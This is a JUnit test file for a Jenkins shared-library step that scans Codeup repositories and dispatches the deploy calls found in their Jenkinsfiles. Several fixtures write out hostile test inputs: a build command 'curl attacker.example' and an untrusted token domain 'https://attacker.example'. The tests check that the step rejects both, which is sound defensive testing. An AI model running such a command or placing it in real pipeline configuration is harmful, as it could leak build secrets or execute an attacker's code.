package com.daluobai.jenkinslib.vars

import com.daluobai.jenkinslib.api.CodeupApi
import groovy.lang.ExpandoMetaClass
import groovy.lang.GroovyShell
import groovy.lang.GroovySystem
import org.junit.jupiter.api.AfterEach
import org.junit.jupiter.api.Test

import static org.junit.jupiter.api.Assertions.assertEquals
import static org.junit.jupiter.api.Assertions.assertThrows
import static org.junit.jupiter.api.Assertions.assertTrue

class DispatchCodeupRepositoriesVarTest {

    @AfterEach
    void cleanup() {
        GroovySystem.metaClassRegistry.removeMetaClass(CodeupApi)
    }

    @Test
    void dispatchCodeupRepositoriesParsesAndDispatchesSupportedMethod() {
        stubCodeupApi(
                [[id: '1', name: 'repo-a']],
                [
                        '1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']]
                ],
                [
                        '1:Jenkinsfile.groovy': """
                                def customConfig = [SHARE_PARAM: [appName: 'repo-a']]
                                deployJavaWeb(customConfig)
                                """.stripIndent()
                ]
        )

        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
        List<Map<String, Object>> dispatchedConfigs = []
        script.metaClass.echo = { Object message -> }
        script.metaClass.deployJavaWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }

        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', allowAllRepositories: true]] as Object[])

        assertEquals(1, result.scannedRepositories)
        assertEquals(1, result.scannedFiles)
        assertEquals(1, result.dispatched)
        assertTrue(result.rejected.isEmpty())
        assertTrue(result.failed.isEmpty())
        assertEquals('repo-a', dispatchedConfigs[0].SHARE_PARAM.appName)
    }

    @Test
    void dispatchCodeupRepositoriesDispatchesDeployWebByDefault() {
        stubCodeupApi(
                [[id: '1', name: 'repo-a']],
                [
                        '1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']]
                ],
                [
                        '1:Jenkinsfile.groovy': """
                                def customConfig = [SHARE_PARAM: [appName: 'repo-a']]
                                deployWeb(customConfig)
                                """.stripIndent()
                ]
        )

        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
        List<Map<String, Object>> dispatchedConfigs = []
        script.metaClass.echo = { Object message -> }
        script.metaClass.deployWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }

        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', allowAllRepositories: true]] as Object[])

        assertEquals(1, result.scannedRepositories)
        assertEquals(1, result.scannedFiles)
        assertEquals(1, result.dispatched)
        assertTrue(result.rejected.isEmpty())
        assertTrue(result.failed.isEmpty())
        assertEquals('repo-a', dispatchedConfigs[0].SHARE_PARAM.appName)
    }

    @Test
    void dispatchCodeupRepositoriesContinuesWhenRepositoryFails() {
        stubCodeupApi(
                [[id: '1', name: 'repo-a'], [id: '2', name: 'repo-b']],
                [
                        '1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']]
                ],
                [
                        '1:Jenkinsfile.groovy': """
                                def customConfig = [SHARE_PARAM: [appName: 'repo-a']]
                                deployJavaWeb(customConfig)
                                """.stripIndent()
                ],
                ['2']
        )

        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
        List<Map<String, Object>> dispatchedConfigs = []
        script.metaClass.echo = { Object message -> }
        script.metaClass.deployJavaWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }

        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', allowAllRepositories: true]] as Object[])

        assertEquals(2, result.scannedRepositories)
        assertEquals(1, result.dispatched)
        assertEquals(1, result.failed.size())
        assertEquals('repo-b', result.failed[0].repositoryName)
        assertEquals(1, dispatchedConfigs.size())
    }

    @Test
    void dispatchCodeupRepositoriesRejectsMethodOutsideExplicitAllowedMethodsAndContinues() {
        stubCodeupApi(
                [[id: '1', name: 'repo-a'], [id: '2', name: 'repo-b']],
                [
                        '1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']],
                        '2': [[name: 'Jenkinsfile.groovy', path: 'ci/Jenkinsfile.groovy', type: 'blob']]
                ],
                [
                        '1:Jenkinsfile.groovy': """
                                def customConfig = [SHARE_PARAM: [appName: 'repo-a']]
                                deployJavaWeb(customConfig)
                                """.stripIndent(),
                        '2:ci/Jenkinsfile.groovy': """
                                def customConfig = [SHARE_PARAM: [appName: 'repo-b']]
                                deployWeb(customConfig)
                                """.stripIndent()
                ]
        )

        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
        List<Map<String, Object>> dispatchedConfigs = []
        script.metaClass.echo = { Object message -> }
        script.metaClass.deployJavaWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }

        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', allowedMethods: ['deployJavaWeb'], allowAllRepositories: true]] as Object[])

        assertEquals(2, result.scannedRepositories)
        assertEquals(2, result.scannedFiles)
        assertEquals(1, result.dispatched)
        assertEquals(1, result.rejected.size())
        assertEquals('repo-b', result.rejected[0].repositoryName)
        assertEquals(1, dispatchedConfigs.size())
    }

    @Test
    void dispatchCodeupRepositoriesFiltersByAllowedRepositoryNames() {
        stubCodeupApi(
                [[id: '1', name: 'repo-a', path: 'group/service-a'], [id: '2', name: 'repo-b', path: 'group/service-b']],
                [
                        '1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']],
                        '2': [[name: 'Jenkinsfile.groovy', path: 'ci/Jenkinsfile.groovy', type: 'blob']]
                ],
                [
                        '1:Jenkinsfile.groovy': """
                                def customConfig = [SHARE_PARAM: [appName: 'repo-a']]
                                deployJavaWeb(customConfig)
                                """.stripIndent(),
                        '2:ci/Jenkinsfile.groovy': """
                                def customConfig = [SHARE_PARAM: [appName: 'repo-b']]
                                deployJavaWeb(customConfig)
                                """.stripIndent()
                ]
        )

        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
        List<Map<String, Object>> dispatchedConfigs = []
        script.metaClass.echo = { Object message -> }
        script.metaClass.deployJavaWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }

        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', allowedRepositoryNames: ['repo-b']]] as Object[])

        assertEquals(2, result.scannedRepositories)
        assertEquals(1, result.scannedFiles)
        assertEquals(1, result.dispatched)
        assertTrue(result.rejected.isEmpty())
        assertTrue(result.failed.isEmpty())
        assertEquals(1, dispatchedConfigs.size())
        assertEquals('repo-b', dispatchedConfigs[0].SHARE_PARAM.appName)
    }

    @Test
    void dispatchCodeupRepositoriesFiltersByConfiguredJenkinsfileName() {
        stubCodeupApi(
                [[id: '1', name: 'repo-a']],
                [
                        '1': [
                                [name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob'],
                                [name: 'Jenkinsfile.release.groovy', path: 'ci/Jenkinsfile.release.groovy', type: 'blob']
                        ]
                ],
                [
                        '1:Jenkinsfile.groovy'           : """
                                def customConfig = [SHARE_PARAM: [appName: 'default-pipeline']]
                                deployJavaWeb(customConfig)
                                """.stripIndent(),
                        '1:ci/Jenkinsfile.release.groovy': """
                                def customConfig = [SHARE_PARAM: [appName: 'release-pipeline']]
                                deployJavaWeb(customConfig)
                                """.stripIndent()
                ]
        )

        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
        List<Map<String, Object>> dispatchedConfigs = []
        script.metaClass.echo = { Object message -> }
        script.metaClass.deployJavaWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }

        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', jenkinsfileName: 'Jenkinsfile.release.groovy', allowAllRepositories: true]] as Object[])

        assertEquals(1, result.scannedRepositories)
        assertEquals(1, result.scannedFiles)
        assertEquals(1, result.dispatched)
        assertTrue(result.rejected.isEmpty())
        assertTrue(result.failed.isEmpty())
        assertEquals(1, dispatchedConfigs.size())
        assertEquals('release-pipeline', dispatchedConfigs[0].SHARE_PARAM.appName)
    }

    @Test
    void dispatchCodeupRepositoriesSkipsAllWhenAllowedRepositoryNamesIsEmpty() {
        stubCodeupApi(
                [[id: '1', name: 'repo-a']],
                [
                        '1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']]
                ],
                [
                        '1:Jenkinsfile.groovy': """
                                def customConfig = [SHARE_PARAM: [appName: 'repo-a']]
                                deployJavaWeb(customConfig)
                                """.stripIndent()
                ]
        )

        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
        int dispatchCount = 0
        script.metaClass.echo = { Object message -> }
        script.metaClass.deployJavaWeb = { Map customConfig -> dispatchCount++ }

        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', allowedRepositoryNames: []]] as Object[])

        assertEquals(1, result.scannedRepositories)
        assertEquals(0, result.scannedFiles)
        assertEquals(0, result.dispatched)
        assertEquals(0, dispatchCount)
        assertTrue(result.rejected.isEmpty())
        assertTrue(result.failed.isEmpty())
    }

    @Test
    void dispatchCodeupRepositoriesSupportsDryRun() {
        stubCodeupApi(
                [[id: '1', name: 'repo-a']],
                [
                        '1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']]
                ],
                [
                        '1:Jenkinsfile.groovy': """
                                def customConfig = [SHARE_PARAM: [appName: 'repo-a']]
                                deployJavaWeb(customConfig)
                                """.stripIndent()
                ]
        )

        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
        int dispatchCount = 0
        script.metaClass.echo = { Object message -> }
        script.metaClass.deployJavaWeb = { Map customConfig -> dispatchCount++ }

        Map result = (Map) script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id', dryRun: true, allowAllRepositories: true]] as Object[])

        assertEquals(1, result.scannedRepositories)
        assertEquals(1, result.scannedFiles)
        assertEquals(0, result.dispatched)
        assertEquals(0, dispatchCount)
    }

    @Test
    void dispatchCodeupRepositoriesRequiresRepositoryTrustBoundary() {
        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))

        IllegalArgumentException error = assertThrows(IllegalArgumentException.class) {
            script.invokeMethod('call', [[token: 'pt-token', organizationId: 'org-id']] as Object[])
        }

        assertTrue(error.message.contains('allowedRepositoryNames'))
    }

    @Test
    void dispatchCodeupRepositoriesRejectsUntrustedTokenDestination() {
        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))

        IllegalArgumentException error = assertThrows(IllegalArgumentException.class) {
            script.invokeMethod('call', [[
                    token: 'pt-token', organizationId: 'org-id',
                    domain: 'https://attacker.example', allowAllRepositories: true
            ]] as Object[])
        }

        assertTrue(error.message.contains('allowedDomains'))
    }

    @Test
    void dispatchCodeupRepositoriesRejectsUnapprovedRemoteCommands() {
        stubCodeupApi(
                [[id: '1', name: 'repo-a']],
                ['1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']]],
                ['1:Jenkinsfile.groovy': """
                        def customConfig = [DEPLOY_PIPELINE: [stepsBuildNpm: [buildCMD: 'curl attacker.example']]]
                        deployWeb(customConfig)
                        """.stripIndent()]
        )

        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
        script.metaClass.echo = { Object message -> }

        Map result = (Map) script.invokeMethod('call', [[
                token                 : 'pt-token',
                organizationId        : 'org-id',
                allowedRepositoryNames: ['repo-a'],
                dryRun                : true
        ]] as Object[])

        assertEquals(1, result.rejected.size())
        assertTrue(result.rejected[0].reason.contains('allowedCommandValues'))
    }

    @Test
    void dispatchCodeupRepositoriesDispatchesExplicitlyAuthorizedRemoteCommand() {
        stubCodeupApi(
                [[id: '1', name: 'repo-a']],
                ['1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']]],
                ['1:Jenkinsfile.groovy': """
                        def customConfig = [DEPLOY_PIPELINE: [stepsBuildNpm: [buildCMD: 'npm run build']]]
                        deployWeb(customConfig)
                        """.stripIndent()]
        )

        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
        List<Map<String, Object>> dispatchedConfigs = []
        script.metaClass.echo = { Object message -> }
        script.metaClass.deployWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }

        Map result = (Map) script.invokeMethod('call', [[
                token                 : 'pt-token',
                organizationId        : 'org-id',
                allowedRepositoryNames: ['repo-a'],
                allowedCommandValues  : ['npm run build']
        ]] as Object[])

        assertEquals(1, result.dispatched)
        assertTrue(result.rejected.isEmpty())
        assertTrue(result.failed.isEmpty())
        assertEquals('npm run build', dispatchedConfigs[0].DEPLOY_PIPELINE.stepsBuildNpm.buildCMD)
    }

    @Test
    void dispatchCodeupRepositoriesFailsAtEndAfterContinuingOtherRepositories() {
        stubCodeupApi(
                [[id: '1', name: 'repo-a'], [id: '2', name: 'repo-b']],
                [
                        '1': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']],
                        '2': [[name: 'Jenkinsfile.groovy', path: 'Jenkinsfile.groovy', type: 'blob']]
                ],
                [
                        '1:Jenkinsfile.groovy': """
                                def customConfig = [DEPLOY_PIPELINE: [stepsBuildNpm: [buildCMD: 'curl attacker.example']]]
                                deployWeb(customConfig)
                                """.stripIndent(),
                        '2:Jenkinsfile.groovy': """
                                def customConfig = [SHARE_PARAM: [appName: 'repo-b']]
                                deployJavaWeb(customConfig)
                                """.stripIndent()
                ]
        )

        GroovyShell shell = new GroovyShell(CodeupApi.class.classLoader)
        Script script = shell.parse(new File('vars/dispatchCodeupRepositories.groovy'))
        List<Map<String, Object>> dispatchedConfigs = []
        script.metaClass.echo = { Object message -> }
        script.metaClass.error = { Object message -> throw new IllegalStateException(message.toString()) }
        script.metaClass.deployJavaWeb = { Map customConfig -> dispatchedConfigs.add(customConfig) }

        IllegalStateException failure = assertThrows(IllegalStateException.class) {
            script.invokeMethod('call', [[
                    token                 : 'pt-token',
                    organizationId        : 'org-id',
                    allowedRepositoryNames: ['repo-a', 'repo-b'],
                    failAtEnd             : true
            ]] as Object[])
        }

        assertEquals(1, dispatchedConfigs.size())
        assertEquals('repo-b', dispatchedConfigs[0].SHARE_PARAM.appName)
        assertTrue(failure.message.contains('失败: 0'))
        assertTrue(failure.message.contains('拒绝: 1'))
    }

    private static void stubCodeupApi(List<Map<String, Object>> repositories,
                                      Map<String, List<Map<String, Object>>> filesByRepositoryId,
                                      Map<String, String> contentsByRepositoryAndPath,
                                      Collection<String> failedRepositoryIds = []) {
        ExpandoMetaClass emc = new ExpandoMetaClass(CodeupApi, false, true)
        emc.listRepositories = { String domain, String token, String organizationId ->
            return repositories
        }
        emc.listFiles = { String domain, String token, String repositoryId, String path, String ref, String type, String organizationId ->
            if (failedRepositoryIds.contains(repositoryId)) {
                throw new RuntimeException("repo failed: ${repositoryId}")
            }
            return filesByRepositoryId[repositoryId] ?: []
        }
        emc.getFileContent = { String domain, String token, String repositoryId, String filePath, String ref, String organizationId ->
            return contentsByRepositoryAndPath["${repositoryId}:${filePath}"]
        }
        emc.initialize()
        GroovySystem.metaClassRegistry.setMetaClass(CodeupApi, emc)
    }
}
